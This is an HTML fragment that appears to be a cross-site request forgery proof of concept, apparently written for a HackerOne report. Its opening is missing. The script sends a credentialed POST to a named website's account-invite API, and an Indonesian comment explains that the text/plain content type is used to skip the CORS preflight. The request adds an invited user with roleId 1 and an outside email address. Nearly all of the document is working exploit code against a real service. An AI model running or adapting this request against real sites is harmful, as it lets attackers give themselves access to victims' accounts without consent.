<body>

    fetch("https://www.sellingpilot.com/api/account/inviting?_xhr=true", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "text/plain" // dipakai agar request dianggap "simple request" (hindari preflight CORS)
      },
      body: JSON.stringify({
        name: "victim hackerone",
        email: "hackerkorban8@gmail.com",
        roleId: 1,
        status: 0,
        vendorId: null,
        lang: "en-us"
      })
    });
  </script>
</body>
